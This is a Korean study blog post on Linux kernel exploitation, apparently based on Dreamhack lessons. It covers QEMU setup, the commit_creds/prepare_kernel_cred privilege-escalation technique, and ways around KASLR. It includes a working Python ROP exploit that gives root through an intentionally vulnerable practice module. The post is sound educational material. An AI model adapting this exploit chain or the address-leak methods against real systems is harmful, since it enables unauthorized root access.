---
layout: post
title:  "Linux Kernel Analysis"
author: 5un9hun
categories: [ Study ]
tags: [ Linux, Kernel, QEMU ]
image: assets/images/analysis/linux_kernel/title.png
description: "linux kernel analysis"
hidden: false
---

HackTheBox Pwnable 문제를 풀다가 시도해 본 적도 없는 커널 문제에 맞닥뜨렸다. 따라서 이번 기회에 리눅스 커널에 대해서 공부해보기로 했다.


- [셋팅 및 부팅](#셋팅-및-부팅)
- [익스플로잇](#익스플로잇)
	* [익스플로잇 기법 : ROP](#익스플로잇-기법--rop)
- [보호 기법](#보호-기법)
	* [보호 기법 : KASLR](#보호-기법--kaslr)
	* [Bypass : Kernel Leak](#bypass--kernel-leak)



## 셋팅 및 부팅

bzImage2vmlinux

```bash
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

사용법

```bash
./extract-vmlinux bzImage > ./vmlinux
```

폴더 압축 해제

```bash
mkdir fs
cd fs
cpio -idm < ../rootfs.cpio
```

폴더 압축

```bash
find . -print0 | cpio --null -ov --format=newc > ../rootfs.cpio
```

커널 부팅

```bash
#! /bin/sh
qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
    -monitor /dev/null \
    -initrd cpio파일 \
    -smp cores=4,threads=2 \
    -cpu qemu64,smep,smap 2>/dev/null \
    -gdb tcp::1234
```

모듈 부착

```bash
sudo insmod <filename>
```

모듈 탈착

```bash
sudo rmmod <modulename>
```

## 익스플로잇

일반 리눅스 바이너리의 최종적인 목표는 쉘을 획득하는 것이다. 다음은 일반 바이너리의 익스플로잇 코드이다.

```c
system("/bin/sh")
```

이에 비해 커널 익스플로잇의 목표는 LPE(Local Privilege Escalation)이다. 

익스플로잇으로 쉘을 획득한다해도 권한이 root가 아니라면 민감한 파일을 접근할 수 없다. 따라서 최종 목표는 권한 상승이다.

다음은 권한 상승을 위한 익스플로잇 코드다.

```c
commit_creds(prepare_kernel_cred(NULL))
```

NULL은 0과 같고, 이는 root의 권한과 같다. (root = 0)

위와 같은 권한 상승 페이로드를 설명하기에 앞서 task_struct 를 먼저 알아야 한다. 

task_struct 구조체는 커널 메모리 내에 존재하며, 프로세스의 메모리 맵, 파일 디스크립터, 프로세스의 권한 등의 정보를 저장한다. 이 구조체 내에 주요 필드는 다음과 같다.

dreamhack 강의에서 보기좋게 정리되어있다.

| field | description |
| --- | --- |
| state | 현재 태스크의 실행 상태입니다. 0은 실행 중이거나 실행(스케줄) 가능한 상태를 나타내며, 양수 값은 태스크가 정지되었거나 대기 중임을 나타냅니다. |
| tasks | 커널에 존재하는 태스크의 연결 리스트 노드입니다. |
| mm | mm_struct는 사용자 메모리 영역(주소공간)에 관한 정보를 가지고 있는 구조체입니다. 일반적으로 같은 프로세스 내의 스레드는 모두 mm이 같습니다. |
| cred | 현재 태스크의 신원 정보를 가리키는 포인터입니다. |
| comm | 실행 파일 또는 스레드의 이름을 저장합니다. |
| files | 열린 파일 디스크립터 정보를 가지고 있습니다. 일반적으로 같은 프로세스 내의 스레드는 모두 files가 같습니다. |
{:.mbtablestyle}

여기서 권한 상승에 중요한 멤버가 cred 필드이다.

cred 구조체의 멤버는 다음과 같다.

| field | description |
| --- | --- |
| usage | cred 참조 카운터입니다. 하나의 cred 구조체는 여러 개의 프로세스에서 동시에 사용될 수 있습니다. |
| uid | 프로세스를 소유하고 있는 사용자 ID(User ID, UID)를 저장합니다. 0으로 덮어쓰면 해당 태스크는 seteuid(0)로 최고관리자 권한을 획득할 수 있습니다. |
| euid | 실효적인 사용자 ID(Effective User ID, EUID)를 저장합니다. 권한 검사에 실제 사용되는 값을 저장하며, 0으로 덮어쓰면 해당 태스크는 최고관리자 권한을 획득하게 됩니다. 일반적으로는 uid와 같은 값을 가집니다. |
| gid, egid | 각각 Real GID와 Effective GID를 저장합니다. GID는 group ID의 약자로 사용자 그룹의 식별번호를 의미합니다. |
{:.mbtablestyle}

gdb를 통해서 현재 쉘의 pid가 담긴 task_struct.cred→euid 또는 uid 를 0으로 셋팅하면 euid 가 root로 세팅되어서 권한이 상승된 것을 확인할 수 있다.

다음은 [vmlinux-gdb.py](http://vmlinux-gdb.py/) 의 명령어로 task_struct 구조체에 쉽게 접근할 수 있게 해준다.

| command | description |
| --- | --- |
| $lx_current() | 선택된 CPU 코어의 현재 프로세스 또는 스레드의 태스크 구조체를 반환합니다. |
| $lx_task_by_pid(\<PID\>) | 프로세스 식별자(PID)가 \<PID\> 인 프로세스 또는 스레드의 태스크 구조체를 반환합니다. |
{:.mbtablestyle}

이제 처음에 언급한 권한 상승 코드를 살펴볼 것이다.

```c
commit_creds(prepare_kernel_cred(NULL))
```

커널에서 사용하는 함수인 prepare_kernel_cred() 와 commit_creds() 를 이용하여 root 권한을 획득할 수 있다.

이러한 형식의 익스플로잇 코드는 일반적으로 cred 구조체를 직접 조작하는 것보다 안정적이다.

prepare_kernel_cred 함수는 원하는 신원 정보의 cred 구조체를 생성하는 함수이다.

```c
struct cred *prepare_kernel_cred(struct task_struct *daemo)
```

함수 내부적으로는 daemo 구조체를 통해 cred 구조체를 가져오고, 그 값을 old 변수에 저장해놓는다. 그리고 새로운 cred 포인터인 new 변수를 할당하여 old를 new에 복사하여 리턴한다.

간단하게 코드로 나타내면 다음과 같다.

```c
struct cred *prepare_kernel_cred(struct task_struct *daemo) {
  ...
	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred); //root일 경우 init_cred == root 권한
	
	...
	
	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	*new = *old;
	return new;
}
```

commit_creds 함수는 현재 task의 신원을 다른 신원으로 변경하는 커널 함수이다.

```c
int commit_creds(struct cred *new)
```

함수 내부적으로 현재 task_struct를 가리키는 task 포인터를 선언한다. 이 후 이 현재 task_struct인 task 포인터의 cred 구조체를 인자로 받은 cred 구조체 new로 교체한다.

코드로 나타내면 다음과 같다.

```c
int commit_creds(struct cred *new) {
	...

	struct task_struct *task = current; //current == 현재 task
	
	... 
	
	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, new);

}
```

결과적으로 이 두 함수를 사용하여 root의 권한을 획득하려면 다음과 같은 익스플로잇 코드가 나온다.

```c
commit_creds(prepare_kernel_cred(NULL))
```

prepare_kernel_cred 의 인자로 NULL(0)을 전달하여 root의 cred를 반환시키고, 이를 다시 commit_creds 의 인자로 전달하면 현재 task의 권한을 root로 상승시킬 수 있다.

### 익스플로잇 기법 : ROP

커널 익스플로잇에도 ROP 기법을 적용할 수 있다. 일반적인 Buffer Overflow 취약점이 발생했다고 가정한다. ret의 위치의 값을 조작할 수 있을 때, ROP 기법을 적용할 수 있다.

ROP 기법을 위해서는 가젯을 찾아야한다. 가젯같은경우 System.map 파일 또는 vmlinux 파일을 통해 얻을 수 있다. 

```bash
readelf -s vmlinux | grep -w -e prepare_kernel_cred -e commit_creds
```

![Untitled](/assets/images/analysis/linux_kernel/Untitled.png)

![Untitled](/assets/images/analysis/linux_kernel/Untitled%201.png)

단, 이러한 가젯의 경우 kaslr 기법이 적용되지 않은 상태에서 부팅이 되어야 가젯을 이용할 수 있다.

다음과 같이 qemu 부팅 시 kaslr 을 설정할 수 있다.

```bash
#! /bin/sh
qemu-system-x86_64 \
		...
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
    ...
```

ROP를 수행하는 과정은 기존의 일반 리눅스 바이너리와 같다.

**실습**

다음은 드림핵의 Bof 취약점이 발생하는 커널 모듈에서의 ROP 익스플로잇의 실습이다.

시스템에서 write가 발생했을 때 bof_write 함수가 호출된다.

```c
static ssize_t bof_write(struct file *file, const char __user *buf,
			 size_t count, loff_t *ppos)
{
	bof_func(buf, count);  /* see vuln.S */
	return count;
}
```

내부적으로는 bof_func 함수가 호출된다.

그리고 bof_func 함수는 다음과 같다.

```c
.intel_syntax noprefix
	.text

	# void bof_func(const char __user *buf, size_t count)
	.globl bof_func
	.type bof_func, @function
bof_func:
	# {
			.cfi_startproc
	push rbp
			.cfi_def_cfa_offset 16
			.cfi_offset 6, -16
	mov rbp, rsp
			.cfi_def_cfa_register 6
	sub rsp, 0x70

	lea rax, .Lleave_ret[rip]
	lea rcx, [rsi - 1]
	and rcx, ~7
	mov [rsp + rcx], rax    # *(RSP + ((count - 1) & ~0x7)) = &.Lleave_ret;

	mov rdx, rsi
	mov rsi, rdi
	lea rdi, [rsp - 0x8]
	xor eax, eax
	call _copy_from_user    # copy_from_user(RSP - 8, buf, count);

	# }
.Lleave_ret:
	leave
			.cfi_restore 6
			.cfi_def_cfa 7, 8
	ret
			.cfi_endproc
	.size bof_func, .-bof_func

	.section .note.GNU-stack, "", @progbits
```

대충 스택에 leave_ret을 놓고, 사용자의 입력이 바로 ret에 들어가는 것 같다…?

따라서 lke-bof.ko 모듈을 로드시키고, 다음을 입력한다.

```bash
echo "AAAAAAAA" > /proc/lke-bof 
```

그러면 rip가 0x4141414141414141 로 되고, segment fault가 발생한 것을 알 수 있다.

```bash
[ 1906.972215] general protection fault: 0000 [#1] SMP NOPTI
[ 1906.974270] CPU: 0 PID: 437 Comm: bash Tainted: G           OE     5.4.0-1.vu-drhvr #1
[ 1906.975796] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-1ubuntu1.1 04/01/
2014
[ 1906.978789] RIP: 0010:0x4141414141414141
[ 1906.980329] ------------[ cut here ]------------
...
```

따라서 이 부분에서 ROP를 통해 다음 페이로드를 입력하면 권한 상승을 발생시킬 수 있다.

```c
commit_creds(prepare_kernel_cred(NULL))
```

파이썬 스크립트를 이용해서 간편하게 보낼 수 있다.

```python
from struct import *
import os

commit_creds = 0xffffffff8108157b
prepare_kernel_cred = 0xffffffff81081716

xor_edi_edi_ret = 0xffffffff810a1035
mov_rdi_rax_dummy_ret = 0xffffffff8114d09b

open("/proc/lke-bof", "wb").write(pack("6Q", 
	xor_edi_edi_ret, # xor edi, edi; ret
	prepare_kernel_cred, # prepare_kernel_cred
	mov_rdi_rax_dummy_ret, # mov rdi, rax ; xor eax, eax ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
	commit_creds # commit_creds
))

print("uid : " + str(os.getuid()))
os.execlp("bash", "-bash")
```

이 스크립트를 실행하면 LPE 공격에 성공한 것을 알 수 있다.

![Untitled](/assets/images/analysis/linux_kernel/Untitled%202.png)

## 보호 기법

### 보호 기법 : KASLR

KASLR 기법은 커널 메모리 주소의 예측을 어렵기하기 위해서 나온 보호 기법이다. qemu 실행시 nokaslr 옵션을 추가해서 비활성화할 수 있다.

ALSR 기법을 적용한 바이너리는 code, data, heap 영역 등의 베이스 주소가 실행 중에 변경되지 않는다는 한계가 있는 것처럼, KASLR 기법이 적용된 커널도 재부팅하기 전까지는 베이스 주소가 변하지 않는다. 따라서 패널 커닉 등의 예외 상황이 발생하지 않는 한 무차별 공격(Brute Force) 등의 공격으로 커널의 베이스 주소를 구할 수 있다.

또한, 리눅스 KASLR 기법은 ASLR 기법에 비해 무차별 공격에 더욱 취약하다. ASLR 기법은 16비트 이상의 엔트로피를 가지는 반면, KASLR 기법은 32비트에서는 최대 8비트, 64비트에서는 최대 9비트의 엔트로피를 가지고 있다. (엔트로피 = 주소를 구성하는 전체 비트 중 변경될 수 있는 비트의 수)

이는 32bit에서는 2^8 = 256 이고, 64bit에서는 2^9 = 512 만큼의 주소 공간이 생길 수 있다.

엔트로피가 N, 시도 횟수가 α일 때, 추측에 성공할 확률이다.

![Untitled](/assets/images/analysis/linux_kernel/Untitled%203.png)

엔트로피가 8비트의 경우, 178번을 시도하고, 9비트일 경우, 355번을 시도하면 50%확률로 추측에 성공할 수 있다. (최근에는 이를 개선하기 위해 커널 코드를 함수 단위로 재배치하는 패치가 개발되고 있다.)

**ASLR 기법과 KASLR 기법 차이점**

|  | ASLR (사용자 영역) | KASLR (커널 영역) |
| --- | --- | --- |
| 목적 | 바이너리 섹션들의 주소 랜덤화 | 커널 코드 및 데이터의 주소 랜덤화 |
| 적용 시점 | 바이너리 실행시 | 커널 부팅 시 |
| 재배치 주소 공간 | 사용자 주소 공간 | 커널 주소 공간 |
| 한계 | 바이너리가 실행되는 동안은 주소가 고정됨 | 재부팅 전에는 주소가 고정됨. 엔트로피가 작음 |
| 비고 | 바이너리의 코드 섹션은 바이너리에 PIE가 적용되어 있어야 랜덤화가 가능합니다. |  |
{:.mbtablestyle}

커널의 기본 주소

```bash
sudo grep _stext /boot/System.map-`uname -r`
```

커널의 실제 주소

```bash
sudo grep _stext /proc/kallsyms
```

nokaslr 를 없애고 부팅을 시키면 커널의 실제 주소가 달라진 것을 확인할 수 있다.

![Untitled](/assets/images/analysis/linux_kernel/Untitled%204.png)

### Bypass : Kernel Leak

1. 커널 주소 노출
    1. 직접적인 leak
        - 2.6.29 이하 버전의 커널에서는 /proc/[PID]/stat 또는 /proc/[PID]/wchan 가상 파일을 통해 커널 주소를 손쉽게 획득할 수 있다.
    2. dmesg 출력 (커널 로그 출력)
        - 커널 코드에서 printk 라는 함수를 이용하면 커널 로그에 메세지를 남길 수 있다. 따라서 커널 모듈에서 디버깅 등으로 커널 포인터 값을 출력한다면 커널 로그에 접근할 권한이 있는 사용자는 커널 주소를 얻을 수 있다.
        - 리눅스 커널 개발진들은 이를 방지하고자 %p 형식으로 출력될 때, 주소에 해시 연산을 적용해서 출력시킨다.
            - ex) 0xfffffff8108157b → 0x0000000070d2fc92
        - 만약 커널 코드가 printk를 통해 커널 주소가 leak된다면 일반 사용자는 dmesg (/dev/kmsg) 커널 로그를 접근할 수 없지만 충분한 권한이 있는 사용자는 이를 읽어들여 kaslr을 무력화할 수 있다.
2. 초기화되지 않은 메모리
    - memset 누락 등의 이유로 메모리가 초기화되지 않고 출력되면 공격자를 이를 바탕으로 프로그램의 주소를 획득할 수 있다.
    - 특히, 커널 데이터를 사용자 공간으로 복사하는 put_user 함수, copy_to_user 함수 등을 사용할 때 전달할 버퍼를 제대로 초기화해야한다.
    - 구조체 패딩에 의한 leak도 가능하다. 컴파일러에서 패딩을 추가할 때, 중간에 삽입한 패딩은 초기화가 안될 수도 있다. (Structleak 플러그인을 통해 방지 가능)
3. OOB read (Out Of Bound read)
    - 사용자 입력을 검증하지 않고 배열 인덱스나 size값으로 사용하면 OOB 접근이 가능하다. OOB가 발생하는 버퍼의 뒤에 커널 주소가 존재한다면 공격자는 OOB read 공격을 통해 커널 주소를 leak할 수 있다.
    - stack - heap - global 영역에서 발생할 수 있다.

**Conference**

[Introduction: Linux Kernel Exploit🐧 | Dreamhack](https://learn.dreamhack.io/36)

[Background: Kernel Debugging | Dreamhack](https://learn.dreamhack.io/51)

[Exploit Tech: prepare & commit | Dreamhack](https://learn.dreamhack.io/61)

[Mitigation: KASLR | Dreamhack](https://learn.dreamhack.io/65)

[Exploit Tech: Kernel Leak | Dreamhack](https://learn.dreamhack.io/68)